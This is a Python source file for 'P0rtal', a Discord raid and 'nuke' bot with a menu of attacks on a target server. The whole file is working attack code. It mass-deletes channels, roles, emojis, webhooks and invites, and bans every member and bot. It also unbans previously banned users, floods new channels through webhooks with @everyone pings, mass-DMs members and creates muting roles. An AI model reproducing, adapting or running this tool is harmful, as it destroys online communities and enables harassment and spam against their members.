import os
import sys
import json
import ctypes
import pystyle
import datetime
import asyncio
import discord
from discord.ext import commands
from pystyle import Colorate, Colors, Center, Write

with open('config.json') as f:
    config = json.load(f)

bot_config = config['Bot']
bot_token = bot_config['token']
bot_savelogs = bot_config['saveLogs']
bot_logsfilename = bot_config['logsFileName']
if len(str(bot_config['serverId'])) == 0:
    discord_server_id = ''
    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.red}[!] {pystyle.Colors.reset}Discord server id not set. Please set the server id in config.json and restart P0rtal.")
    exit()
else:
    discord_server_id = int(bot_config['serverId'])

webraid_config = config['RaidOptions']['webRaid']
webraid_tageveryone = webraid_config['tagEveryone']
webraid_taghere = webraid_config['tagHere']
webraid_mesage = webraid_config['message']
webraid_channelname = webraid_config['channelName']
webraid_deleteallchannels = webraid_config['deleteAllChannels']
webraid_banallbots = webraid_config['banAllBots']

dmraid_config = config['RaidOptions']['dmRaid']
dmraid_tagperson = dmraid_config['tagPerson']
dmraid_message = dmraid_config['message']

nukeserver_config = config['RaidOptions']['nukeServer']
nukeserver_removeservericon = nukeserver_config['removeServerIcon']
nukeserver_changeservername = nukeserver_config['changeServerName']
nukeserver_servername = nukeserver_config['serverName']
nukeserver_deleteallchannels = nukeserver_config['deleteAllChannels']
nukeserver_deleteallroles = nukeserver_config['deleteAllRoles']
nukeserver_deleteallemojis = nukeserver_config['deleteAllEmojis']
nukeserver_deleteallwebhooks = nukeserver_config['deleteAllWebhooks']
nukeserver_deleteallinvites = nukeserver_config['deleteAllInvites']
nukeserver_removeallbans = nukeserver_config['removeAllBans']
nukeserver_banallmembers = nukeserver_config['banAllMembers']
nukeserver_banmessage = nukeserver_config['banMessage']

roleraid_config = config['RaidOptions']['roleRaid']
roleraid_createroles = roleraid_config['createRoles']
roleraid_rolecount = int(roleraid_config['roleCount'])
roleraid_applytoeveryone = roleraid_config['applyToEveryone']
roleraid_rolename = roleraid_config['roleName']
roleraid_rolecolor = int(roleraid_config['roleColor'], 16)
roleraid_rolehoist = bool(roleraid_config['roleHoist'])
roleraid_rolementionable = bool(roleraid_config['roleMentionable'])
roleraid_rolemute = roleraid_config['roleMute']
roleraid_deleteallroles = roleraid_config['deleteAllRoles']

p0rtal1 = 1

intents = discord.Intents.default()
intents.members = True

p0rtal = commands.Bot(command_prefix='----------------------[P0rtal]----------------------', intents=intents)
p0rtal.remove_command('help')

def get_time():
    ct = datetime.datetime.now()
    ft = ct.strftime("%d/%m/%Y %H:%M:%S")
    return ft

def save_log(log):
    global p0rtal1
    if bot_savelogs == "True":
        if p0rtal1 == 1:
            with open(f"{bot_logsfilename}.txt", "a", encoding="utf-8") as f:
                f.write(" ███████████     █████               █████              ████ \n")
                f.write("░░███░░░░░███  ███░░░███            ░░███              ░░███ \n")
                f.write(" ░███    ░███ ███   ░░███ ████████  ███████    ██████   ░███ \n")
                f.write(" ░██████████ ░███    ░███░░███░░███░░░███░    ░░░░░███  ░███ \n")
                f.write(" ░███░░░░░░  ░███    ░███ ░███ ░░░   ░███      ███████  ░███ \n")
                f.write(" ░███        ░░███   ███  ░███       ░███ ███ ███░░███  ░███ \n")
                f.write(" █████        ░░░█████░   █████      ░░█████ ░░████████ █████\n")
                f.write(" ░░░░░           ░░░░░░   ░░░░░        ░░░░░   ░░░░░░░░ ░░░░░ \n")
                f.write("---------------------------------------------------------------\n")
                f.write("                    | Made by: zZan54 |                        \n")
                f.write("                   | github.com/zZan54 |                       \n")
                f.write("---------------------------------------------------------------\n")
            p0rtal1 = 0
        else:
            with open(f"{bot_logsfilename}.txt", "a", encoding="utf-8") as f:
                f.write(fr"[{get_time()}]{log}" + "\n")
    else:
        pass

async def restart():
    await p0rtal.close()
    os.system(f"{sys.executable} {os.path.basename(__file__)}")

async def option_selection(option_select):
    if option_select == '1':
        save_log("[?] Select your option: 1")
        server = p0rtal.get_guild(discord_server_id)

        if webraid_banallbots == "True":
            for member in server.members:
                if member.bot:
                    try:
                        await member.ban(reason=webraid_channelname)
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.blue}[+] {pystyle.Colors.reset}Banned | Name: {member.name} | Id: {member.id} | Type: bot")
                        save_log(f"[P0rtal][!][+] Banned | Name: {member.name} | Id: {member.id} | Type: bot")
                    except Exception as e:
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to ban | Name: {member.name} | Id: {member.id} | Type: bot | Reason: {e}")
                        save_log(f"[P0rtal][!][-] Failed to ban | Name: {member.name} | Id: {member.id} | Type: bot | Reason: {e}")
                        continue
        else:
            pass

        if webraid_deleteallchannels == "True":
           server_channels = len(server.channels)
           channel_count = 0
           for channel in server.channels:
                channel_count += 1
                try:
                    await channel.delete()
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[{channel_count}/{server_channels}]{pystyle.Colors.blue}[-] {pystyle.Colors.reset}Deleted | Name: {channel.name} | Id: {channel.id} | Type: {channel.type}")
                    save_log(f"[P0rtal][{channel_count}/{server_channels}][+] Deleted | Name: {channel.name} | Id: {channel.id} | Type: {channel.type}")
                except Exception as e:
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[{channel}/{server_channels}]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to delete | Name: {channel.name} | Id: {channel.id} | Type: {channel.type} | Reason: {e}")
                    save_log(f"[P0rtal][{channel_count}/{server_channels}][-] Failed to delete | Name: {channel.name} | Id: {channel.id} | Type: {channel.type} | Reason: {e}")
                    continue
        else:
            pass

        for i in range(30):
            await server.create_text_channel(webraid_channelname)
            print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[{i}]{pystyle.Colors.green}[+] {pystyle.Colors.reset}Created | Name: {webraid_channelname} | Type: text")
            save_log(f"[P0rtal][{i}][+] Created | Name: {webraid_channelname} | Type: text")
            
        async def send_message(webhook):
            for i in range(30):
                try:
                    if webraid_tageveryone == "True" and webraid_taghere == "True":
                            await webhook.send(f"@everyone @here {webraid_mesage}")
                    elif webraid_tageveryone == "True" and webraid_taghere == "False":
                            await webhook.send(f"@everyone {webraid_mesage}")
                    elif webraid_tageveryone == "False" and webraid_taghere == "True":
                            await webhook.send(f"@here {webraid_mesage}")
                    elif webraid_tageveryone == "False" and webraid_taghere == "False":
                            await webhook.send(f"{webraid_mesage}")
                    else:
                            await webhook.send(f"{webraid_mesage}")

                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.green}[+] {pystyle.Colors.reset}Webhook Sent | Message: {webraid_mesage} | Channel_id: {channel.id}")
                    save_log(f"[P0rtal][!][+] Webhook Sent | Message: {webraid_mesage} | Channel_id: {channel.id}")
                except Exception as e:
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Webhook Failed | Reason: {e}")
                    save_log(f"[P0rtal][!][-] Webhook Failed | Reason: {e}")
                    continue

        for channel in server.channels:
            if isinstance(channel, discord.TextChannel):
                for webhook in await channel.webhooks():
                    try:
                        await webhook.delete()
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.blue}[+] {pystyle.Colors.reset}Deleted | Webhook: {webhook.name} | Id: {webhook.id}")
                        save_log(f"[P0rtal][!][+] Deleted | Webhook: {webhook.name} | Id: {webhook.id}")
                    except Exception as e:
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Cannot delete webhook | Channel: {channel} | Reason: {e}")
                        save_log(f"[P0rtal][!][-] Cannot delete webhook | Channel: {channel} | Reason: {e}")
                        continue

                try:
                    new_webhook = await channel.create_webhook(name=webraid_channelname)
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.green}[+] {pystyle.Colors.reset}Webhook created | Webhook: {new_webhook.name} | Channe id: {new_webhook.channel_id}")
                    save_log(f"[P0rtal][!][+] Webhook Created | Webhook: {new_webhook.name} | Channel id: {new_webhook.channel_id}")
                except Exception as e:
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to create a webhook | Reason: {e}")
                    save_log(f"[P0rtal][!][-] Failed to create a webhook | Reason: {e}")
                    continue
                try:
                    asyncio.create_task(send_message(new_webhook))
                except Exception as e:
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Webhook Failed | Reason: {e}")
                    save_log(f"[P0rtal][!][-] Webhook Failed | Reason: {e}")
                    continue

        enter_to_continue = Write.Input("[P0rtal] Click enter to continue.", Colors.blue_to_purple, interval=0.0005)
        save_log("[P0rtal] Click enter to continue.")

    elif option_select == '2':
        save_log("[?] Select your option: 2")
        server = p0rtal.get_guild(discord_server_id)

        if len(dmraid_message) != 0:
            for member in server.members:
                if member == p0rtal.user or member.bot:
                    continue
                try:
                    if dmraid_tagperson == "True":
                        await member.send(f"{member.mention} {dmraid_message}")
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.green}[+] {pystyle.Colors.reset}DM sent | Name: {member.name} | Id: {member.id}")
                    elif dmraid_tagperson == "False":
                        await member.send(dmraid_message)
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.green}[+] {pystyle.Colors.reset}DM sent | Name: {member.name} | Id: {member.id}")
                    else:
                        await member.send(dmraid_message)
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.green}[+] {pystyle.Colors.reset}DM sent | Name: {member.name} | Id: {member.id}")
                    save_log(f"[P0rtal][!][+] DM sent | Name: {member.name} | Id: {member.id}")
                except Exception as e:
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}DM failed | Name: {member.name} | Id: {member.id}")
                    save_log(f"[P0rtal][!][+] DM failed | Name: {member.name} | Id: {member.id}")
                    continue
        else:
            print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.red}[!] {pystyle.Colors.reset}DM Mesage is not set. Please set the message in config.json and restart P0rtal.")
            save_log("[P0rtal][!] DM Mesage is not set. Please set the message in config.json and restart P0rtal.")

        enter_to_continue = Write.Input("[P0rtal] Click enter to continue.", Colors.blue_to_purple, interval=0.0005)
        save_log("[P0rtal] Click enter to continue.")

    elif option_select == '3':
        save_log("[?] Select your option: 3")
        server = p0rtal.get_guild(discord_server_id)

        if nukeserver_removeservericon == "True":
            try:
                await server.edit(icon=None)
                print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.blue}[+] {pystyle.Colors.reset}Server icon removed successfully.")
                save_log("[P0rtal][!][+] Server icon removed successfully.")
            except Exception as e:
                print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Error while trying to remove server icon. | Reason: {e}")
                save_log(f"[P0rtal][!][-] Error while trying to remove server icon. | Reason: {e}")
                pass
        else:
            pass

        if nukeserver_changeservername == "True":
            try:
                await server.edit(name=nukeserver_servername)
                print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.blue}[+] {pystyle.Colors.reset}Server name changed successfully. | Server name: {nukeserver_servername}")
                save_log(f"[P0rtal][!][+] Server name changed successfully. | Server name: {nukeserver_servername}")
            except Exception as e:
                print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Error while trying to change the server name. | Reason: {e}")
                save_log(f"[P0rtal][!][-] Error while trying to change the server name. | Reason: {e}")
                pass
        else:
            pass

        if nukeserver_deleteallchannels == "True":
            server_channels = len(server.channels)
            channel_count = 0
            for channel in server.channels:
                channel_count += 1
                try:
                    await channel.delete()
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[{channel_count}/{server_channels}]{pystyle.Colors.blue}[-] {pystyle.Colors.reset}Deleted | Name: {channel.name} | Id: {channel.id} | Type: {channel.type}")
                    save_log(f"[P0rtal][{channel_count}/{server_channels}][+] Deleted | Name: {channel.name} | Id: {channel.id} | Type: {channel.type}")
                except Exception as e:
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[{channel_count}/{server_channels}]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to delete | Name: {channel.name} | Id: {channel.id} | Type: {channel.type} | Reason: {e}")
                    save_log(f"[P0rtal][{channel_count}/{server_channels}][-] Failed to delete | Name: {channel.name} | Id: {channel.id} | Type: {channel.type} | Reason: {e}")
                    continue
        else:
            pass

        if nukeserver_deleteallroles == "True":
            for role in server.roles:
                if role != server.default_role:
                    try:
                        await role.delete()
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.blue}[+] {pystyle.Colors.reset}Deleted | Role: {role.name} | Id: {role.id}")
                        save_log(f"[P0rtal][!][+] Deleted | Role: {role.name} | Id: {role.id}")
                    except Exception as e:
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to delete | Role: {role.name} | Id: {role.id} | Reason: {e}")
                        save_log(f"[P0rtal][!][-] Failed to delete | Role: {role.name} | Id: {role.id} | Reason: {e}")
                        continue
        else:
            pass

        if nukeserver_deleteallemojis == "True":
            for emoji in server.emojis:
                try:
                    await emoji.delete()
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.blue}[+] {pystyle.Colors.reset}Deleted | Emoji: {emoji.name} | Id: {emoji.id}")
                    save_log(f"[P0rtal][!][+] Deleted | Emoji: {emoji.name} | Id: {emoji.id}")
                except Exception as e:
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to delete | Emoji: {emoji.name} | Id: {emoji.id} | Reason: {e}")
                    save_log(f"[P0rtal][!][-] Failed to delete | Emoji: {emoji.name} | Id: {emoji.id} | Reason: {e}")
                    continue
        else:
            pass

        if nukeserver_deleteallwebhooks == "True":
            webhooks = await server.webhooks()
            for webhook in webhooks:
                try:
                    await webhook.delete()
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.blue}[+] {pystyle.Colors.reset}Deleted | Webhook: {webhook.name} | Id: {webhook.id}")
                    save_log(f"[P0rtal][!][+] Deleted | Webhook: {webhook.name} | Id: {webhook.id}")
                except Exception as e:
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to delete | Webhook: {webhook.name} | Id: {webhook.id} | Reason: {e}")
                    save_log(f"[P0rtal][!][-] Cannot delete webhook | Channel: {channel} | Reason: {e}")
                    continue
        else:
            pass

        if nukeserver_deleteallinvites == "True":
            invites = await server.invites()
            for invite in invites:
                try:
                    await invite.delete()
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.blue}[+] {pystyle.Colors.reset}Deleted | Invite: discord.gg/{invite.code} | Id: {invite.id} | Created by: {invite.inviter}")
                    save_log(f"[P0rtal][!][+] Deleted | Invite: discord.gg/{invite.code} | Id: {invite.id} | Created by: {invite.inviter}")
                except Exception as e:
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to delete | Invite: discord.gg/{invite.code} | Id: {invite.id} | Reason: {e}")
                    save_log(f"[P0rtal][!][-] Failed to delete | Invite: discord.gg/{invite.code} | Id: {invite.id} | Reason: {e}")
                    continue
        else:
            pass

        if nukeserver_removeallbans == "True":
            bans = await server.bans()
            for ban in bans:
                try:
                    await server.unban(ban.user)
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.green}[+] {pystyle.Colors.reset}User unbanned | User: {ban.user} | Id: {ban.user.id}")
                    save_log(f"[P0rtal][!][+] User unbanned | User: {ban.user} | Id: {ban.user.id}")
                except Exception as e:
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to unban | User: {ban.user} | Id: {ban.user.id} | Reason: {e}")
                    save_log(f"[P0rtal][!][-] Failed to unban | User: {ban.user} | Id: {ban.user.id} | Reason: {e}")
                    continue
        else:
            pass

        if nukeserver_banallmembers == "True":
            members = await server.fetch_members(limit=None).flatten()
            for member in members:
                if member != p0rtal.user:
                    try:
                        await server.ban(member, reason=nukeserver_banmessage)
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.green}[+] {pystyle.Colors.reset}User banned | User: {member} | Id: {member.id}")
                        save_log(f"[P0rtal][!][+] User banned | User: {member} | Id: {member.id}")
                    except Exception as e:
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to ban | User: {member} | Id: {member.id} | Reason: {e}")
                        save_log(f"[P0rtal][!][-] Failed to ban | User: {member} | Id: {member.id} | Reason: {e}")
                        continue
        else:
            pass

        enter_to_continue = Write.Input("[P0rtal] Click enter to continue.", Colors.blue_to_purple, interval=0.0005)
        save_log("[P0rtal] Click enter to continue.")

    elif option_select == '4':
        save_log("[?] Select your option: 4")
        server = p0rtal.get_guild(discord_server_id)

        if roleraid_deleteallroles == "True":
            for role in server.roles:
                if role != server.default_role:
                    try:
                        await role.delete()
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.blue}[+] {pystyle.Colors.reset}Deleted | Role: {role.name} | Id: {role.id}")
                        save_log(f"[P0rtal][!][+] Deleted | Role: {role.name} | Id: {role.id}")
                    except Exception as e:
                        print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to delete | Role: {role.name} | Id: {role.id} | Reason: {e}")
                        save_log(f"[P0rtal][!][-] Failed to delete | Role: {role.name} | Id: {role.id} | Reason: {e}")
                        continue
        else:
            pass

        if roleraid_createroles == "True":
            try:
                created_roles = []
                if roleraid_rolemute == "True":
                    perms = discord.Permissions(send_messages=False)
                else:
                    perms = None
                for i in range(roleraid_rolecount):
                    new_role = await server.create_role(name=roleraid_rolename, color=discord.Color(roleraid_rolecolor), hoist=roleraid_rolehoist, mentionable=roleraid_rolementionable, permissions=perms)
                    created_roles.append(new_role)
                    print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.green}[+] {pystyle.Colors.reset}Created | Role: {new_role.name} | Id: {new_role.id}")
                    save_log(f"[P0rtal][!][+] Created | Role: {new_role.name} | Id: {new_role.id}")
            except Exception as e:
                print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to create role | Reason: {e}")
                save_log(f"[P0rtal][!][-] Failed to create role | Reason: {e}")
                pass

        if roleraid_createroles == "True":
            if roleraid_applytoeveryone == "True":
                for member in server.members:
                    if not member.bot:
                        for role in created_roles:
                            try:
                                await member.add_roles(role)
                                print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.green}[+] {pystyle.Colors.reset}Role added | Member: {member} | Id: {member.id}")
                                save_log(f"[P0rtal][!][+] Role added | Member: {member} | Id: {member.id}")
                            except Exception as e:
                                print(f"{Colorate.Horizontal(Colors.blue_to_purple, '[P0rtal]', 2)}{pystyle.Colors.cyan}[!]{pystyle.Colors.red}[-] {pystyle.Colors.reset}Failed to add role | Reason: {e}")
                                save_log(f"[P0rtal][!][-] Failed to add role | Reason: {e}")
                                continue
            else:
                pass
        else:
            pass

        enter_to_continue = Write.Input("[P0rtal] Click enter to continue.", Colors.blue_to_purple, interval=0.0005)
        save_log("[P0rtal] Click enter to continue.")

    elif option_select == '5':
        save_log("[?] Select your option: 5")
        await restart()

    elif option_select == '6':
        save_log("[?] Select your option: 6")
        await p0rtal.close()
        os.system("cls")

def options():
    selected_option = None

    while selected_option not in ('1', '2', '3', '4', '5', '6'):
        os.system('cls')
        p0rtal_text = Center.XCenter("""
     ███████████     █████               █████              ████ 
    ░░███░░░░░███  ███░░░███            ░░███              ░░███ 
     ░███    ░███ ███   ░░███ ████████  ███████    ██████   ░███ 
     ░██████████ ░███    ░███░░███░░███░░░███░    ░░░░░███  ░███ 
     ░███░░░░░░  ░███    ░███ ░███ ░░░   ░███      ███████  ░███ 
     ░███        ░░███   ███  ░███       ░███ ███ ███░░███  ░███ 
     █████        ░░░█████░   █████      ░░█████ ░░████████ █████
    ░░░░░           ░░░░░░   ░░░░░        ░░░░░   ░░░░░░░░ ░░░░░ 
    ---------------------------------------------------------------
                        | Made by: zZan54 |
                       | github.com/zZan54 |
    ---------------------------------------------------------------
     [1] Web Raid | [2] DM Raid | [3] Nuke Server | [4] Role Raid
                    [5] Restart | [6] Exit
    """)
        print(Colorate.Vertical(Colors.blue_to_purple, p0rtal_text, 1))

        selected_option = Write.Input("[?] Select your option: ", Colors.blue_to_purple, interval=0.0025)

    return selected_option

@p0rtal.event
async def on_ready():
    ctypes.windll.kernel32.SetConsoleTitleW(f"P0rtal | Logged in as: {p0rtal.user.name}#{p0rtal.user.discriminator} | Bot Id: {p0rtal.user.id} | Server Id: {discord_server_id} | github.com/zZan54")
    
    while True:
        selected_option = options()
        await option_selection(selected_option)

        if selected_option == '5':
            break

        if selected_option == '6':
            break

p0rtal.run(bot_token)